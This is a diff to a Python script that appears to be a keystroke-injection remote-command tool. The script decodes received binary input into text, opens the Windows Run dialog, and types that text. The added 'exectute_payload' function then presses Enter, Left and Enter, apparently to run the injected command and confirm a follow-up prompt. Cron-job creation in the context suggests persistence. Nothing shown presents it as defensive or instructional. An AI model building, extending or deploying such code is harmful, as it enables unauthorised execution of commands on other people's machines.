@@ -35,6 +35,15 @@ def type_text(text):
     keyboard = Controller()
     keyboard.type(text)
 
+def exectute_payload():
+    keyboard = Controller()
+    keyboard.press(Key.enter)
+    keyboard.release(Key.enter)
+    keyboard.press(Key.left)
+    keyboard.release(Key.left)
+    keyboard.press(Key.enter)
+    keyboard.release(Key.enter)
+
 def create_cron_job(python_file_path, interval=None, run_once=False):
     python_file_path = os.path.abspath(python_file_path)
     python_interpreter = os.path.abspath('python')
@@ -124,6 +133,7 @@ def main():
                                     time.sleep(1)
                                     type_text(plaintext)
                                     open('incoming.txt', 'w').close()
+                                    exectute_payload()
 
                                 else:
                                     print("Invalid binary input")
@@ -161,6 +171,7 @@ def main():
                                     press_windows_r()
                                     time.sleep(1)
                                     type_text(plaintext)
+                                    exectute_payload()
                                 else:
                                     print("Invalid binary input")
                             else:
